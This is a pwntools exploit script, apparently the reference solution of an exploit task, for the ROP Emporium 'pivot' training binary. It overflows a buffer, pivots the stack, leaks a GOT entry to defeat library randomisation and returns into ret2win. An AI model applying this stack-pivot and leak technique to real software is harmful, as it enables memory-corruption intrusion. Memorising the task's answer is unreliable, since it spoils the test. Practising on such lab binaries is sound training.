code:
import argparse
import os
import re
from pathlib import Path
from pwn import *

def run_exploit(binary_path, runtime_dir, elf):
    p = process([str(binary_path)], env={'LD_LIBRARY_PATH': str(runtime_dir)})
    libpivot = ELF(str(runtime_dir / 'libpivot.so'), checksec=False)
    p.recvuntil(b'pivot: ')
    pivot_addr = int(p.recvline().strip(), 16)
    pop_rax_ret = elf.symbols['usefulGadgets']
    xchg_rsp_rax_ret = elf.symbols['usefulGadgets'] + 2
    first_stage_rop = b'A' * 40
    first_stage_rop += p64(pop_rax_ret)
    first_stage_rop += p64(pivot_addr)
    first_stage_rop += p64(xchg_rsp_rax_ret)
    p.recvuntil(b'Send a ROP chain now and it will land there\n')
    p.sendline(first_stage_rop)
    rop = ROP(elf)
    rop.call(elf.plt['foothold_function'])
    rop.call(elf.plt['puts'], [elf.got['foothold_function']])
    rop.call(elf.symbols['main'])
    second_stage_rop = rop.chain()
    p.recvuntil(b'Now please send your stack smash\n')
    p.sendline(second_stage_rop)
    p.recvuntil(b'pivot by ROP Emporium\nx86_64\n')
    p.recvuntil(b'Call ret2win() from libpivot\n')
    p.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
    p.recvline()
    p.recvuntil(b'Send a ROP chain now and it will land there\n')
    p.recvuntil(b'Thank you!\n')
    p.recvuntil(b'Now please send your stack smash\n')
    foothold_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    libpivot_base = foothold_leak - libpivot.symbols['foothold_function']
    ret2win_addr = libpivot_base + libpivot.symbols['ret2win']
    rop2 = ROP(elf)
    rop2.call(ret2win_addr)
    third_stage_rop = rop2.chain()
    p.sendline(third_stage_rop)
    print(p.recvall().decode())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('binary', nargs='?', default=None)
    parser.add_argument('--binary', dest='binary_flag', default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary or os.environ.get('TARGET_BINARY')
    if not binary:
        raise SystemExit('missing binary path')
    binary_path = Path(binary).resolve()
    runtime_dir = Path(os.environ.get('TARGET_RUNTIME_DIR', str(binary_path.parent))).resolve()
    context.binary = str(binary_path)
    context.arch = 'amd64'
    context.bits = 64
    context.log_level = 'info'
    elf = ELF(str(binary_path), checksec=False)
    run_exploit(binary_path, runtime_dir, elf)

if __name__ == '__main__':
    main()
success_conditions: Look for WIN / FLAG markers in target output.
